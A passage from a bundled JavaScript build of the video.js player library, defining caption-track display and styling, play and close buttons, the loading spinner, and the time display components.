  * - matches the previously selected {@link TextTrack}'s language only
  * - is the first default captions track
  * - is the first default descriptions track
  *
  * @listens Player#loadstart
  */


  TextTrackDisplay.prototype.preselectTrack = function preselectTrack() {
    var modes = { captions: 1, subtitles: 1 };
    var trackList = this.player_.textTracks();
    var userPref = this.player_.cache_.selectedLanguage;
    var firstDesc = void 0;
    var firstCaptions = void 0;
    var preferredTrack = void 0;

    for (var i = 0; i < trackList.length; i++) {
      var track = trackList[i];

      if (userPref && userPref.enabled && userPref.language === track.language) {
        // Always choose the track that matches both language and kind
        if (track.kind === userPref.kind) {
          preferredTrack = track;
          // or choose the first track that matches language
        } else if (!preferredTrack) {
          preferredTrack = track;
        }

        // clear everything if offTextTrackMenuItem was clicked
      } else if (userPref && !userPref.enabled) {
        preferredTrack = null;
        firstDesc = null;
        firstCaptions = null;
      } else if (track['default']) {
        if (track.kind === 'descriptions' && !firstDesc) {
          firstDesc = track;
        } else if (track.kind in modes && !firstCaptions) {
          firstCaptions = track;
        }
      }
    }

    // The preferredTrack matches the user preference and takes
    // precendence over all the other tracks.
    // So, display the preferredTrack before the first default track
    // and the subtitles/captions track before the descriptions track
    if (preferredTrack) {
      preferredTrack.mode = 'showing';
    } else if (firstCaptions) {
      firstCaptions.mode = 'showing';
    } else if (firstDesc) {
      firstDesc.mode = 'showing';
    }
  };

  /**
   * Turn display of {@link TextTrack}'s from the current state into the other state.
   * There are only two states:
   * - 'shown'
   * - 'hidden'
   *
   * @listens Player#loadstart
   */


  TextTrackDisplay.prototype.toggleDisplay = function toggleDisplay() {
    if (this.player_.tech_ && this.player_.tech_.featuresNativeTextTracks) {
      this.hide();
    } else {
      this.show();
    }
  };

  /**
   * Create the {@link Component}'s DOM element.
   *
   * @return {Element}
   *         The element that was created.
   */


  TextTrackDisplay.prototype.createEl = function createEl() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-text-track-display'
    }, {
      'aria-live': 'off',
      'aria-atomic': 'true'
    });
  };

  /**
   * Clear all displayed {@link TextTrack}s.
   */


  TextTrackDisplay.prototype.clearDisplay = function clearDisplay() {
    if (typeof window_1.WebVTT === 'function') {
      window_1.WebVTT.processCues(window_1, [], this.el_);
    }
  };

  /**
   * Update the displayed TextTrack when a either a {@link Player#texttrackchange} or
   * a {@link Player#fullscreenchange} is fired.
   *
   * @listens Player#texttrackchange
   * @listens Player#fullscreenchange
   */


  TextTrackDisplay.prototype.updateDisplay = function updateDisplay() {
    var tracks = this.player_.textTracks();

    this.clearDisplay();

    // Track display prioritization model: if multiple tracks are 'showing',
    //  display the first 'subtitles' or 'captions' track which is 'showing',
    //  otherwise display the first 'descriptions' track which is 'showing'

    var descriptionsTrack = null;
    var captionsSubtitlesTrack = null;
    var i = tracks.length;

    while (i--) {
      var track = tracks[i];

      if (track.mode === 'showing') {
        if (track.kind === 'descriptions') {
          descriptionsTrack = track;
        } else {
          captionsSubtitlesTrack = track;
        }
      }
    }

    if (captionsSubtitlesTrack) {
      if (this.getAttribute('aria-live') !== 'off') {
        this.setAttribute('aria-live', 'off');
      }
      this.updateForTrack(captionsSubtitlesTrack);
    } else if (descriptionsTrack) {
      if (this.getAttribute('aria-live') !== 'assertive') {
        this.setAttribute('aria-live', 'assertive');
      }
      this.updateForTrack(descriptionsTrack);
    }
  };

  /**
   * Add an {@link Texttrack} to to the {@link Tech}s {@link TextTrackList}.
   *
   * @param {TextTrack} track
   *        Text track object to be added to the list.
   */


  TextTrackDisplay.prototype.updateForTrack = function updateForTrack(track) {
    if (typeof window_1.WebVTT !== 'function' || !track.activeCues) {
      return;
    }

    var cues = [];

    for (var _i = 0; _i < track.activeCues.length; _i++) {
      cues.push(track.activeCues[_i]);
    }

    window_1.WebVTT.processCues(window_1, cues, this.el_);

    if (!this.player_.textTrackSettings) {
      return;
    }

    var overrides = this.player_.textTrackSettings.getValues();

    var i = cues.length;

    while (i--) {
      var cue = cues[i];

      if (!cue) {
        continue;
      }

      var cueDiv = cue.displayState;

      if (overrides.color) {
        cueDiv.firstChild.style.color = overrides.color;
      }
      if (overrides.textOpacity) {
        tryUpdateStyle(cueDiv.firstChild, 'color', constructColor(overrides.color || '#fff', overrides.textOpacity));
      }
      if (overrides.backgroundColor) {
        cueDiv.firstChild.style.backgroundColor = overrides.backgroundColor;
      }
      if (overrides.backgroundOpacity) {
        tryUpdateStyle(cueDiv.firstChild, 'backgroundColor', constructColor(overrides.backgroundColor || '#000', overrides.backgroundOpacity));
      }
      if (overrides.windowColor) {
        if (overrides.windowOpacity) {
          tryUpdateStyle(cueDiv, 'backgroundColor', constructColor(overrides.windowColor, overrides.windowOpacity));
        } else {
          cueDiv.style.backgroundColor = overrides.windowColor;
        }
      }
      if (overrides.edgeStyle) {
        if (overrides.edgeStyle === 'dropshadow') {
          cueDiv.firstChild.style.textShadow = '2px 2px 3px ' + darkGray + ', 2px 2px 4px ' + darkGray + ', 2px 2px 5px ' + darkGray;
        } else if (overrides.edgeStyle === 'raised') {
          cueDiv.firstChild.style.textShadow = '1px 1px ' + darkGray + ', 2px 2px ' + darkGray + ', 3px 3px ' + darkGray;
        } else if (overrides.edgeStyle === 'depressed') {
          cueDiv.firstChild.style.textShadow = '1px 1px ' + lightGray + ', 0 1px ' + lightGray + ', -1px -1px ' + darkGray + ', 0 -1px ' + darkGray;
        } else if (overrides.edgeStyle === 'uniform') {
          cueDiv.firstChild.style.textShadow = '0 0 4px ' + darkGray + ', 0 0 4px ' + darkGray + ', 0 0 4px ' + darkGray + ', 0 0 4px ' + darkGray;
        }
      }
      if (overrides.fontPercent && overrides.fontPercent !== 1) {
        var fontSize = window_1.parseFloat(cueDiv.style.fontSize);

        cueDiv.style.fontSize = fontSize * overrides.fontPercent + 'px';
        cueDiv.style.height = 'auto';
        cueDiv.style.top = 'auto';
        cueDiv.style.bottom = '2px';
      }
      if (overrides.fontFamily && overrides.fontFamily !== 'default') {
        if (overrides.fontFamily === 'small-caps') {
          cueDiv.firstChild.style.fontVariant = 'small-caps';
        } else {
          cueDiv.firstChild.style.fontFamily = fontMap[overrides.fontFamily];
        }
      }
    }
  };

  return TextTrackDisplay;
}(Component);

Component.registerComponent('TextTrackDisplay', TextTrackDisplay);

/**
 * @file loading-spinner.js
 */
/**
 * A loading spinner for use during waiting/loading events.
 *
 * @extends Component
 */

var LoadingSpinner = function (_Component) {
  inherits(LoadingSpinner, _Component);

  function LoadingSpinner() {
    classCallCheck(this, LoadingSpinner);
    return possibleConstructorReturn(this, _Component.apply(this, arguments));
  }

  /**
   * Create the `LoadingSpinner`s DOM element.
   *
   * @return {Element}
   *         The dom element that gets created.
   */
  LoadingSpinner.prototype.createEl = function createEl$$1() {
    var isAudio = this.player_.isAudio();
    var playerType = this.localize(isAudio ? 'Audio Player' : 'Video Player');
    var controlText = createEl('span', {
      className: 'vjs-control-text',
      innerHTML: this.localize('{1} is loading.', [playerType])
    });

    var el = _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-loading-spinner',
      dir: 'ltr'
    });

    el.appendChild(controlText);

    return el;
  };

  return LoadingSpinner;
}(Component);

Component.registerComponent('LoadingSpinner', LoadingSpinner);

/**
 * @file button.js
 */
/**
 * Base class for all buttons.
 *
 * @extends ClickableComponent
 */

var Button = function (_ClickableComponent) {
  inherits(Button, _ClickableComponent);

  function Button() {
    classCallCheck(this, Button);
    return possibleConstructorReturn(this, _ClickableComponent.apply(this, arguments));
  }

  /**
   * Create the `Button`s DOM element.
   *
   * @param {string} [tag="button"]
   *        The element's node type. This argument is IGNORED: no matter what
   *        is passed, it will always create a `button` element.
   *
   * @param {Object} [props={}]
   *        An object of properties that should be set on the element.
   *
   * @param {Object} [attributes={}]
   *        An object of attributes that should be set on the element.
   *
   * @return {Element}
   *         The element that gets created.
   */
  Button.prototype.createEl = function createEl(tag) {
    var props = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    var attributes = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : {};

    tag = 'button';

    props = assign({
      innerHTML: '<span aria-hidden="true" class="vjs-icon-placeholder"></span>',
      className: this.buildCSSClass()
    }, props);

    // Add attributes for button element
    attributes = assign({

      // Necessary since the default button type is "submit"
      type: 'button'
    }, attributes);

    var el = Component.prototype.createEl.call(this, tag, props, attributes);

    this.createControlTextEl(el);

    return el;
  };

  /**
   * Add a child `Component` inside of this `Button`.
   *
   * @param {string|Component} child
   *        The name or instance of a child to add.
   *
   * @param {Object} [options={}]
   *        The key/value store of options that will get passed to children of
   *        the child.
   *
   * @return {Component}
   *         The `Component` that gets added as a child. When using a string the
   *         `Component` will get created by this process.
   *
   * @deprecated since version 5
   */


  Button.prototype.addChild = function addChild(child) {
    var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};

    var className = this.constructor.name;

    log$1.warn('Adding an actionable (user controllable) child to a Button (' + className + ') is not supported; use a ClickableComponent instead.');

    // Avoid the error message generated by ClickableComponent's addChild method
    return Component.prototype.addChild.call(this, child, options);
  };

  /**
   * Enable the `Button` element so that it can be activated or clicked. Use this with
   * {@link Button#disable}.
   */


  Button.prototype.enable = function enable() {
    _ClickableComponent.prototype.enable.call(this);
    this.el_.removeAttribute('disabled');
  };

  /**
   * Disable the `Button` element so that it cannot be activated or clicked. Use this with
   * {@link Button#enable}.
   */


  Button.prototype.disable = function disable() {
    _ClickableComponent.prototype.disable.call(this);
    this.el_.setAttribute('disabled', 'disabled');
  };

  /**
   * This gets called when a `Button` has focus and `keydown` is triggered via a key
   * press.
   *
   * @param {EventTarget~Event} event
   *        The event that caused this function to get called.
   *
   * @listens keydown
   */


  Button.prototype.handleKeyPress = function handleKeyPress(event) {

    // Ignore Space (32) or Enter (13) key operation, which is handled by the browser for a button.
    if (event.which === 32 || event.which === 13) {
      return;
    }

    // Pass keypress handling up for unsupported keys
    _ClickableComponent.prototype.handleKeyPress.call(this, event);
  };

  return Button;
}(ClickableComponent);

Component.registerComponent('Button', Button);

/**
 * @file big-play-button.js
 */
/**
 * The initial play button that shows before the video has played. The hiding of the
 * `BigPlayButton` get done via CSS and `Player` states.
 *
 * @extends Button
 */

var BigPlayButton = function (_Button) {
  inherits(BigPlayButton, _Button);

  function BigPlayButton(player, options) {
    classCallCheck(this, BigPlayButton);

    var _this = possibleConstructorReturn(this, _Button.call(this, player, options));

    _this.mouseused_ = false;

    _this.on('mousedown', _this.handleMouseDown);
    return _this;
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object. Always returns 'vjs-big-play-button'.
   */


  BigPlayButton.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-big-play-button';
  };

  /**
   * This gets called when a `BigPlayButton` "clicked". See {@link ClickableComponent}
   * for more detailed information on what a click can be.
   *
   * @param {EventTarget~Event} event
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  BigPlayButton.prototype.handleClick = function handleClick(event) {
    var playPromise = this.player_.play();

    // exit early if clicked via the mouse
    if (this.mouseused_ && event.clientX && event.clientY) {
      silencePromise(playPromise);
      return;
    }

    var cb = this.player_.getChild('controlBar');
    var playToggle = cb && cb.getChild('playToggle');

    if (!playToggle) {
      this.player_.focus();
      return;
    }

    var playFocus = function playFocus() {
      return playToggle.focus();
    };

    if (isPromise(playPromise)) {
      playPromise.then(playFocus, function () {});
    } else {
      this.setTimeout(playFocus, 1);
    }
  };

  BigPlayButton.prototype.handleKeyPress = function handleKeyPress(event) {
    this.mouseused_ = false;

    _Button.prototype.handleKeyPress.call(this, event);
  };

  BigPlayButton.prototype.handleMouseDown = function handleMouseDown(event) {
    this.mouseused_ = true;
  };

  return BigPlayButton;
}(Button);

/**
 * The text that should display over the `BigPlayButton`s controls. Added to for localization.
 *
 * @type {string}
 * @private
 */


BigPlayButton.prototype.controlText_ = 'Play Video';

Component.registerComponent('BigPlayButton', BigPlayButton);

/**
 * @file close-button.js
 */
/**
 * The `CloseButton` is a `{@link Button}` that fires a `close` event when
 * it gets clicked.
 *
 * @extends Button
 */

var CloseButton = function (_Button) {
  inherits(CloseButton, _Button);

  /**
   * Creates an instance of the this class.
   *
   * @param  {Player} player
   *         The `Player` that this class should be attached to.
   *
   * @param  {Object} [options]
   *         The key/value store of player options.
   */
  function CloseButton(player, options) {
    classCallCheck(this, CloseButton);

    var _this = possibleConstructorReturn(this, _Button.call(this, player, options));

    _this.controlText(options && options.controlText || _this.localize('Close'));
    return _this;
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  CloseButton.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-close-button ' + _Button.prototype.buildCSSClass.call(this);
  };

  /**
   * This gets called when a `CloseButton` gets clicked. See
   * {@link ClickableComponent#handleClick} for more information on when this will be
   * triggered
   *
   * @param {EventTarget~Event} event
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   * @fires CloseButton#close
   */


  CloseButton.prototype.handleClick = function handleClick(event) {

    /**
     * Triggered when the a `CloseButton` is clicked.
     *
     * @event CloseButton#close
     * @type {EventTarget~Event}
     *
     * @property {boolean} [bubbles=false]
     *           set to false so that the close event does not
     *           bubble up to parents if there is no listener
     */
    this.trigger({ type: 'close', bubbles: false });
  };

  return CloseButton;
}(Button);

Component.registerComponent('CloseButton', CloseButton);

/**
 * @file play-toggle.js
 */
/**
 * Button to toggle between play and pause.
 *
 * @extends Button
 */

var PlayToggle = function (_Button) {
  inherits(PlayToggle, _Button);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function PlayToggle(player, options) {
    classCallCheck(this, PlayToggle);

    var _this = possibleConstructorReturn(this, _Button.call(this, player, options));

    _this.on(player, 'play', _this.handlePlay);
    _this.on(player, 'pause', _this.handlePause);
    _this.on(player, 'ended', _this.handleEnded);
    return _this;
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  PlayToggle.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-play-control ' + _Button.prototype.buildCSSClass.call(this);
  };

  /**
   * This gets called when an `PlayToggle` is "clicked". See
   * {@link ClickableComponent} for more detailed information on what a click can be.
   *
   * @param {EventTarget~Event} [event]
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  PlayToggle.prototype.handleClick = function handleClick(event) {
    if (this.player_.paused()) {
      this.player_.play();
    } else {
      this.player_.pause();
    }
  };

  /**
   * This gets called once after the video has ended and the user seeks so that
   * we can change the replay button back to a play button.
   *
   * @param {EventTarget~Event} [event]
   *        The event that caused this function to run.
   *
   * @listens Player#seeked
   */


  PlayToggle.prototype.handleSeeked = function handleSeeked(event) {
    this.removeClass('vjs-ended');

    if (this.player_.paused()) {
      this.handlePause(event);
    } else {
      this.handlePlay(event);
    }
  };

  /**
   * Add the vjs-playing class to the element so it can change appearance.
   *
   * @param {EventTarget~Event} [event]
   *        The event that caused this function to run.
   *
   * @listens Player#play
   */


  PlayToggle.prototype.handlePlay = function handlePlay(event) {
    this.removeClass('vjs-ended');
    this.removeClass('vjs-paused');
    this.addClass('vjs-playing');
    // change the button text to "Pause"
    this.controlText('Pause');
  };

  /**
   * Add the vjs-paused class to the element so it can change appearance.
   *
   * @param {EventTarget~Event} [event]
   *        The event that caused this function to run.
   *
   * @listens Player#pause
   */


  PlayToggle.prototype.handlePause = function handlePause(event) {
    this.removeClass('vjs-playing');
    this.addClass('vjs-paused');
    // change the button text to "Play"
    this.controlText('Play');
  };

  /**
   * Add the vjs-ended class to the element so it can change appearance
   *
   * @param {EventTarget~Event} [event]
   *        The event that caused this function to run.
   *
   * @listens Player#ended
   */


  PlayToggle.prototype.handleEnded = function handleEnded(event) {
    this.removeClass('vjs-playing');
    this.addClass('vjs-ended');
    // change the button text to "Replay"
    this.controlText('Replay');

    // on the next seek remove the replay button
    this.one(this.player_, 'seeked', this.handleSeeked);
  };

  return PlayToggle;
}(Button);

/**
 * The text that should display over the `PlayToggle`s controls. Added for localization.
 *
 * @type {string}
 * @private
 */


PlayToggle.prototype.controlText_ = 'Play';

Component.registerComponent('PlayToggle', PlayToggle);

/**
 * @file format-time.js
 * @module format-time
 */

/**
* Format seconds as a time string, H:MM:SS or M:SS. Supplying a guide (in seconds)
* will force a number of leading zeros to cover the length of the guide.
*
* @param {number} seconds
*        Number of seconds to be turned into a string
*
* @param {number} guide
*        Number (in seconds) to model the string after
*
* @return {string}
*         Time formatted as H:MM:SS or M:SS
*/
var defaultImplementation = function defaultImplementation(seconds, guide) {
  seconds = seconds < 0 ? 0 : seconds;
  var s = Math.floor(seconds % 60);
  var m = Math.floor(seconds / 60 % 60);
  var h = Math.floor(seconds / 3600);
  var gm = Math.floor(guide / 60 % 60);
  var gh = Math.floor(guide / 3600);

  // handle invalid times
  if (isNaN(seconds) || seconds === Infinity) {
    // '-' is false for all relational operators (e.g. <, >=) so this setting
    // will add the minimum number of fields specified by the guide
    h = m = s = '-';
  }

  // Check if we need to show hours
  h = h > 0 || gh > 0 ? h + ':' : '';

  // If hours are showing, we may need to add a leading zero.
  // Always show at least one digit of minutes.
  m = ((h || gm >= 10) && m < 10 ? '0' + m : m) + ':';

  // Check if leading zero is need for seconds
  s = s < 10 ? '0' + s : s;

  return h + m + s;
};

var implementation = defaultImplementation;

/**
 * Replaces the default formatTime implementation with a custom implementation.
 *
 * @param {Function} customImplementation
 *        A function which will be used in place of the default formatTime implementation.
 *        Will receive the current time in seconds and the guide (in seconds) as arguments.
 */
function setFormatTime(customImplementation) {
  implementation = customImplementation;
}

/**
 * Resets formatTime to the default implementation.
 */
function resetFormatTime() {
  implementation = defaultImplementation;
}

var formatTime = function (seconds) {
  var guide = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : seconds;

  return implementation(seconds, guide);
};

/**
 * @file time-display.js
 */
/**
 * Displays the time left in the video
 *
 * @extends Component
 */

var TimeDisplay = function (_Component) {
  inherits(TimeDisplay, _Component);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function TimeDisplay(player, options) {
    classCallCheck(this, TimeDisplay);

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    _this.throttledUpdateContent = throttle(bind(_this, _this.updateContent), 25);
    _this.on(player, 'timeupdate', _this.throttledUpdateContent);
    return _this;
  }

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */


  TimeDisplay.prototype.createEl = function createEl$$1(plainName) {
    var className = this.buildCSSClass();
    var el = _Component.prototype.createEl.call(this, 'div', {
      className: className + ' vjs-time-control vjs-control',
      innerHTML: '<span class="vjs-control-text">' + this.localize(this.labelText_) + '\xA0</span>'
    });

    this.contentEl_ = createEl('span', {
      className: className + '-display'
    }, {
      // tell screen readers not to automatically read the time as it changes
      'aria-live': 'off'
    });

    this.updateTextNode_();
    el.appendChild(this.contentEl_);
    return el;
  };

  TimeDisplay.prototype.dispose = function dispose() {
    this.contentEl_ = null;
    this.textNode_ = null;

    _Component.prototype.dispose.call(this);
  };

  /**
   * Updates the "remaining time" text node with new content using the
   * contents of the `formattedTime_` property.
   *
   * @private
   */


  TimeDisplay.prototype.updateTextNode_ = function updateTextNode_() {
    if (!this.contentEl_) {
      return;
    }

    while (this.contentEl_.firstChild) {
      this.contentEl_.removeChild(this.contentEl_.firstChild);
    }

    this.textNode_ = document_1.createTextNode(this.formattedTime_ || this.formatTime_(0));
    this.contentEl_.appendChild(this.textNode_);
  };

  /**
   * Generates a formatted time for this component to use in display.
   *
   * @param  {number} time
   *         A numeric time, in seconds.
   *
   * @return {string}
   *         A formatted time
   *
   * @private
   */


  TimeDisplay.prototype.formatTime_ = function formatTime_(time) {
    return formatTime(time);
  };

  /**
   * Updates the time display text node if it has what was passed in changed
   * the formatted time.
   *
   * @param {number} time
   *        The time to update to
   *
   * @private
   */


  TimeDisplay.prototype.updateFormattedTime_ = function updateFormattedTime_(time) {
    var formattedTime = this.formatTime_(time);

    if (formattedTime === this.formattedTime_) {
      return;
    }

    this.formattedTime_ = formattedTime;
    this.requestAnimationFrame(this.updateTextNode_);
  };

  /**
   * To be filled out in the child class, should update the displayed time
   * in accordance with the fact that the current time has changed.
   *
   * @param {EventTarget~Event} [event]
   *        The `timeupdate`  event that caused this to run.
   *
   * @listens Player#timeupdate
   */


  TimeDisplay.prototype.updateContent = function updateContent(event) {};

  return TimeDisplay;
}(Component);

/**
 * The text that is added to the `TimeDisplay` for screen reader users.
 *
 * @type {string}
 * @private
 */


TimeDisplay.prototype.labelText_ = 'Time';

/**
 * The text that should display over the `TimeDisplay`s controls. Added to for localization.
 *
 * @type {string}
 * @private
 *
 * @deprecated in v7; controlText_ is not used in non-active display Components
 */
TimeDisplay.prototype.controlText_ = 'Time';

Component.registerComponent('TimeDisplay', TimeDisplay);

/**
 * @file current-time-display.js
 */
/**
 * Displays the current time
 *
 * @extends Component
 */

var CurrentTimeDisplay = function (_TimeDisplay) {
  inherits(CurrentTimeDisplay, _TimeDisplay);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function CurrentTimeDisplay(player, options) {
    classCallCheck(this, CurrentTimeDisplay);

    var _this = possibleConstructorReturn(this, _TimeDisplay.call(this, player, options));

    _this.on(player, 'ended', _this.handleEnded);
    return _this;
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  CurrentTimeDisplay.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-current-time';
  };

  /**
   * Update current time display
   *
   * @param {EventTarget~Event} [event]
   *        The `timeupdate` event that caused this function to run.
   *
   * @listens Player#timeupdate
   */


  CurrentTimeDisplay.prototype.updateContent = function updateContent(event) {
    // Allows for smooth scrubbing, when player can't keep up.
    var time = this.player_.scrubbing() ? this.player_.getCache().currentTime : this.player_.currentTime();

    this.updateFormattedTime_(time);
  };

  /**
   * When the player fires ended there should be no time left. Sadly
   * this is not always the case, lets make it seem like that is the case
   * for users.
   *
   * @param {EventTarget~Event} [event]
   *        The `ended` event that caused this to run.
   *
   * @listens Player#ended
   */


  CurrentTimeDisplay.prototype.handleEnded = function handleEnded(event) {
    if (!this.player_.duration()) {
      return;
    }
    this.updateFormattedTime_(this.player_.duration());
  };

  return CurrentTimeDisplay;
}(TimeDisplay);

/**
 * The text that is added to the `CurrentTimeDisplay` for screen reader users.
 *
 * @type {string}
 * @private
 */


CurrentTimeDisplay.prototype.labelText_ = 'Current Time';

/**
 * The text that should display over the `CurrentTimeDisplay`s controls. Added to for localization.
 *
 * @type {string}
 * @private
 *
 * @deprecated in v7; controlText_ is not used in non-active display Components
 */
CurrentTimeDisplay.prototype.controlText_ = 'Current Time';

Component.registerComponent('CurrentTimeDisplay', CurrentTimeDisplay);

/**
 * @file duration-display.js
 */
/**
 * Displays the duration
 *
 * @extends Component
 */

var DurationDisplay = function (_TimeDisplay) {
  inherits(DurationDisplay, _TimeDisplay);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function DurationDisplay(player, options) {
    classCallCheck(this, DurationDisplay);

    // we do not want to/need to throttle duration changes,
    // as they should always display the changed duration as
    // it has changed
    var _this = possibleConstructorReturn(this, _TimeDisplay.call(this, player, options));

    _this.on(player, 'durationchange', _this.updateContent);

    // Also listen for timeupdate (in the parent) and loadedmetadata because removing those
    // listeners could have broken dependent applications/libraries. These
    // can likely be removed for 7.0.
    _this.on(player, 'loadedmetadata', _this.throttledUpdateContent);
    return _this;
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  DurationDisplay.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-duration';
  };

  /**
   * Update duration time display.
   *
   * @param {EventTarget~Event} [event]
   *        The `durationchange`, `timeupdate`, or `loadedmetadata` event that caused
   *        this function to be called.
   *
   * @listens Player#durationchange
   * @listens Player#timeupdate
   * @listens Player#loadedmetadata
   */


  DurationDisplay.prototype.updateContent = function updateContent(event) {
    var duration = this.player_.duration();

    if (duration && this.duration_ !== duration) {
      this.duration_ = duration;
      this.updateFormattedTime_(duration);
    }
  };

  return DurationDisplay;
}(TimeDisplay);

/**
 * The text that is added to the `DurationDisplay` for screen reader users.
 *
 * @type {string}
 * @private
 */


DurationDisplay.prototype.labelText_ = 'Duration';

/**
 * The text that should display over the `DurationDisplay`s controls. Added to for localization.
 *
 * @type {string}
 * @private
 *
 * @deprecated in v7; controlText_ is not used in non-active display Components
 */
DurationDisplay.prototype.controlText_ = 'Duration';

Component.registerComponent('DurationDisplay', DurationDisplay);

/**
 * @file time-divider.js
 */
/**
 * The separator between the current time and duration.
 * Can be hidden if it's not needed in the design.
 *
 * @extends Component
 */

var TimeDivider = function (_Component) {
  inherits(TimeDivider, _Component);

  function TimeDivider() {
    classCallCheck(this, TimeDivider);
    return possibleConstructorReturn(this, _Component.apply(this, arguments));
  }

  /**
   * Create the component's DOM element
   *
   * @return {Element}
   *         The element that was created.
   */
  TimeDivider.prototype.createEl = function createEl() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-time-control vjs-time-divider',
      innerHTML: '<div><span>/</span></div>'
    });
  };

  return TimeDivider;
}(Component);

Component.registerComponent('TimeDivider', TimeDivider);

/**
 * @file remaining-time-display.js
 */
/**
 * Displays the time left in the video
 *
 * @extends Component
 */

var RemainingTimeDisplay = function (_TimeDisplay) {
  inherits(RemainingTimeDisplay, _TimeDisplay);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function RemainingTimeDisplay(player, options) {
    classCallCheck(this, RemainingTimeDisplay);

    var _this = possibleConstructorReturn(this, _TimeDisplay.call(this, player, options));

    _this.on(player, 'durationchange', _this.throttledUpdateContent);
    _this.on(player, 'ended', _this.handleEnded);
    return _this;
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  RemainingTimeDisplay.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-remaining-time';
  };

  /**
   * The remaining time display prefixes numbers with a "minus" character.
   *
   * @param  {number} time
   *         A numeric time, in seconds.
   *
   * @return {string}
   *         A formatted time
   *
   * @private
   */


  RemainingTimeDisplay.prototype.formatTime_ = function formatTime_(time) {
    // TODO: The "-" should be decorative, and not announced by a screen reader
    return '-' + _TimeDisplay.prototype.formatTime_.call(this, time);
  };

  /**
   * Update remaining time display.
   *
   * @param {EventTarget~Event} [event]
   *        The `timeupdate` or `durationchange` event that caused this to run.
   *
   * @listens Player#timeupdate
   * @listens Player#durationchange
   */


  RemainingTimeDisplay.prototype.updateContent = function updateContent(event) {
    if (!this.player_.duration()) {
      return;
    }

    // @deprecated We should only use remainingTimeDisplay
    // as of video.js 7
    if (this.player_.remainingTimeDisplay) {
      this.updateFormattedTime_(this.player_.remainingTimeDisplay());
    } else {
      this.updateFormattedTime_(this.player_.remainingTime());
    }
  };

  /**
   * When the player fires ended there should be no time left. Sadly
   * this is not always the case, lets make it seem like that is the case
   * for users.
   *
   * @param {EventTarget~Event} [event]
   *        The `ended` event that caused this to run.
   *
   * @listens Player#ended
   */


  RemainingTimeDisplay.prototype.handleEnded = function handleEnded(event) {
    if (!this.player_.duration()) {
      return;
    }
    this.updateFormattedTime_(0);
  };

  return RemainingTimeDisplay;
}(TimeDisplay);

/**
 * The text that is added to the `RemainingTimeDisplay` for screen reader users.
 *
 * @type {string}
 * @private
 */


RemainingTimeDisplay.prototype.labelText_ = 'Remaining Time';

/**
 * The text that should display over the `RemainingTimeDisplay`s controls. Added to for localization.
 *
 * @type {string}
 * @private
 *
 * @deprecated in v7; controlText_ is not used in non-active display Components
 */
RemainingTimeDisplay.prototype.controlText_ = 'Remaining Time';

Component.registerComponent('RemainingTimeDisplay', RemainingTimeDisplay);

/**
 * @file live-display.js
 */
// TODO - Future make it click to snap to live

/**
 * Displays the live indicator when duration is Infinity.
 *
 * @extends Component
 */

var LiveDisplay = function (_Component) {
  inherits(LiveDisplay, _Component);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function LiveDisplay(player, options) {
    classCallCheck(this, LiveDisplay);

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    _this.updateShowing();
    _this.on(_this.player(), 'durationchange', _this.updateShowing);
    return _this;
  }

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */


  LiveDisplay.prototype.createEl = function createEl$$1() {
    var el = _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-live-control vjs-control'
    });

    this.contentEl_ = createEl('div', {
      className: 'vjs-live-display',
      innerHTML: '<span class="vjs-control-text">' + this.localize('Stream Type') + '\xA0</span>' + this.localize('LIVE')
    }, {
      'aria-live': 'off'
    });

    el.appendChild(this.contentEl_);
    return el;
  };

  LiveDisplay.prototype.dispose = function dispose() {
    this.contentEl_ = null;

    _Component.prototype.dispose.call(this);
  };

  /**
   * Check the duration to see if the LiveDisplay should be showing or not. Then show/hide
   * it accordingly
   *
   * @param {EventTarget~Event} [event]
   *        The {@link Player#durationchange} event that caused this function to run.
   *
   * @listens Player#durationchange
   */


